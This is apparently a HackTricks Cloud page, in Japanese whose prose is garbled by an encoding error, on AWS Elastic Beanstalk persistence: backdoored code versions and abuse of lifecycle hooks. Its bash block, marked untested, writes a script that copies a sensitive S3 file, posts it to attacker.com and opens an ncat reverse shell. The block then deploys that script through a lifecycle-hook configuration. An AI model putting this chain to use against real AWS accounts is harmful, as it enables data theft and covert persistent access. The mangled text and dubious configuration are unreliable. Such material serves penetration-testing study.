# AWS - Elastic Beanstalk æ°¸ç¶šåŒ–

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

* ã‚‚ã— **HackTricks ã§ã‚ãªãŸã®ä¼šç¤¾ã‚’å®£ä¼ã—ãŸã„** ã¾ãŸã¯ **PEASS ã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã„** ã¾ãŸã¯ **HackTricks ã‚’ PDF ã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„** å ´åˆã¯ã€[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼ã® PEASS & HackTricks ã‚¹ãƒ¯ãƒƒã‚°**](https://peass.creator-spring.com) ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„ã€‚ã“ã‚Œã¯ç§ãŸã¡ã®ç‹¬å çš„ãª [**NFT**](https://opensea.io/collection/the-peass-family) ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™
* ğŸ’¬ [**Discord ã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f) ã¾ãŸã¯ [**telegram ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass) ã«å‚åŠ ã™ã‚‹ã‹ã€ç§ã‚’ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm) ã§ **ãƒ•ã‚©ãƒ­ãƒ¼** ã—ã¦ãã ã•ã„
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ãŸã‚ã«ã€PR ã‚’** [**HackTricks**](https://github.com/carlospolop/hacktricks) **ã¨** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **ã® GitHub ãƒªãƒã‚¸ãƒˆãƒªã«æå‡ºã—ã¦ãã ã•ã„**

</details>

## Elastic Beanstalk

è©³ç´°ã«ã¤ã„ã¦ã¯ã€ä»¥ä¸‹ã‚’å‚ç…§ã—ã¦ãã ã•ã„ï¼š

{% content-ref url="../../aws-pentesting/aws-services/aws-elastic-beanstalk-enum.md" %}
[aws-elastic-beanstalk-enum.md](../../aws-pentesting/aws-services/aws-elastic-beanstalk-enum.md)
{% endcontent-ref %}

### ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹å†…ã®æ°¸ç¶šåŒ–

AWS ã‚¢ã‚«ã‚¦ãƒ³ãƒˆå†…ã§æ°¸ç¶šæ€§ã‚’ç¶­æŒã™ã‚‹ãŸã‚ã«ã€ã„ãã¤ã‹ã® **æ°¸ç¶šåŒ–ãƒ¡ã‚«ãƒ‹ã‚ºãƒ ã‚’ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹å†…ã«å°å…¥** ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼ˆcron ã‚¸ãƒ§ãƒ–ã€ssh ã‚­ãƒ¼...ï¼‰ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€æ”»æ’ƒè€…ã¯ãã‚Œã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã¦ IAM ãƒ­ãƒ¼ãƒ«ã® **ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ã‚µãƒ¼ãƒ“ã‚¹ã‹ã‚‰è³‡æ ¼æƒ…å ±ã‚’ç›—ã‚€** ã“ã¨ãŒã§ãã¾ã™ã€‚

### ãƒãƒ¼ã‚¸ãƒ§ãƒ³å†…ã®ãƒãƒƒã‚¯ãƒ‰ã‚¢

æ”»æ’ƒè€…ã¯ã€S3 ãƒªãƒã‚¸ãƒˆãƒªå†…ã®ã‚³ãƒ¼ãƒ‰ã«ãƒãƒƒã‚¯ãƒ‰ã‚¢ã‚’ä»•è¾¼ã‚€ã“ã¨ã§ã€å¸¸ã«ãƒãƒƒã‚¯ãƒ‰ã‚¢ã¨äºˆæƒ³ã•ã‚Œã‚‹ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

### æ–°ã—ã„ãƒãƒƒã‚¯ãƒ‰ã‚¢ä»˜ããƒãƒ¼ã‚¸ãƒ§ãƒ³

å®Ÿéš›ã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã®ã‚³ãƒ¼ãƒ‰ã‚’å¤‰æ›´ã™ã‚‹ä»£ã‚ã‚Šã«ã€æ”»æ’ƒè€…ã¯ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®æ–°ã—ã„ãƒãƒƒã‚¯ãƒ‰ã‚¢ä»˜ããƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚’å±•é–‹ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

### ã‚«ã‚¹ã‚¿ãƒ ãƒªã‚½ãƒ¼ã‚¹ãƒ©ã‚¤ãƒ•ã‚µã‚¤ã‚¯ãƒ«ãƒ•ãƒƒã‚¯ã®ä¹±ç”¨

{% hint style="info" %}
TODO: ãƒ†ã‚¹ãƒˆ
{% endhint %}

Elastic Beanstalk ã¯ã€ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã®ãƒ—ãƒ­ãƒ“ã‚¸ãƒ§ãƒ‹ãƒ³ã‚°ã¨çµ‚äº†æ™‚ã«ã‚«ã‚¹ã‚¿ãƒ ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã®ãƒ©ã‚¤ãƒ•ã‚µã‚¤ã‚¯ãƒ«ãƒ•ãƒƒã‚¯ã‚’æä¾›ã—ã¦ã„ã¾ã™ã€‚æ”»æ’ƒè€…ã¯ã€**ãƒ©ã‚¤ãƒ•ã‚µã‚¤ã‚¯ãƒ«ãƒ•ãƒƒã‚¯ã‚’è¨­å®šã—ã¦ã€å®šæœŸçš„ã«ãƒ‡ãƒ¼ã‚¿ã‚’å¤–éƒ¨ã«é€ä¿¡ã—ãŸã‚Šã€AWS ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã‚’ç¶­æŒã—ãŸã‚Šã™ã‚‹ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’å®Ÿè¡Œã™ã‚‹** ã“ã¨ãŒã§ãã¾ã™ã€‚
```bash
bashCopy code# Attacker creates a script that exfiltrates data and maintains access
echo '#!/bin/bash
aws s3 cp s3://sensitive-data-bucket/data.csv /tmp/data.csv
gzip /tmp/data.csv
curl -X POST --data-binary "@/tmp/data.csv.gz" https://attacker.com/exfil
ncat -e /bin/bash --ssl attacker-ip 12345' > stealthy_lifecycle_hook.sh

# Attacker uploads the script to an S3 bucket
aws s3 cp stealthy_lifecycle_hook.sh s3://attacker-bucket/stealthy_lifecycle_hook.sh

# Attacker modifies the Elastic Beanstalk environment configuration to include the custom lifecycle hook
echo 'Resources:
AWSEBAutoScalingGroup:
Metadata:
AWS::ElasticBeanstalk::Ext:
TriggerConfiguration:
triggers:
- name: stealthy-lifecycle-hook
events:
- "autoscaling:EC2_INSTANCE_LAUNCH"
- "autoscaling:EC2_INSTANCE_TERMINATE"
target:
ref: "AWS::ElasticBeanstalk::Environment"
arn:
Fn::GetAtt:
- "AWS::ElasticBeanstalk::Environment"
- "Arn"
stealthyLifecycleHook:
Type: AWS::AutoScaling::LifecycleHook
Properties:
AutoScalingGroupName:
Ref: AWSEBAutoScalingGroup
LifecycleTransition: autoscaling:EC2_INSTANCE_LAUNCHING
NotificationTargetARN:
Ref: stealthy-lifecycle-hook
RoleARN:
Fn::GetAtt:
- AWSEBAutoScalingGroup
- Arn' > stealthy_lifecycle_hook.yaml

# Attacker applies the new environment configuration
aws elasticbeanstalk update-environment --environment-name my-env --option-settings Namespace="aws:elasticbeanstalk:customoption",OptionName="CustomConfigurationTemplate",Value="stealthy_lifecycle_hook.yaml"
```
<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

* ã‚‚ã— **HackTricks ã§ã‚ãªãŸã®ä¼šç¤¾ã‚’å®£ä¼ã—ãŸã„** ã¾ãŸã¯ **PEASS ã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã„** ã¾ãŸã¯ **HackTricks ã‚’ PDF ã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„** å ´åˆã¯ã€[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼ã® PEASS & HackTricks ã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com) ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) ã‚’è¦‹ã¤ã‘ã¦ã€ç‹¬å çš„ãª [**NFTs**](https://opensea.io/collection/the-peass-family) ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’æ¥½ã—ã¿ã¾ã—ã‚‡ã†
* ğŸ’¬ [**Discord ã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f) ã¾ãŸã¯ [**telegram ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass) ã«å‚åŠ ã—ã€ã¾ãŸã¯ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm) ã‚’ **ãƒ•ã‚©ãƒ­ãƒ¼** ã—ã¾ã—ã‚‡ã†ã€‚
* **ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ãŸã‚ã«ã€PR ã‚’** [**HackTricks**](https://github.com/carlospolop/hacktricks) **ã¨** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **ã® GitHub ãƒªãƒã‚¸ãƒˆãƒªã«æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
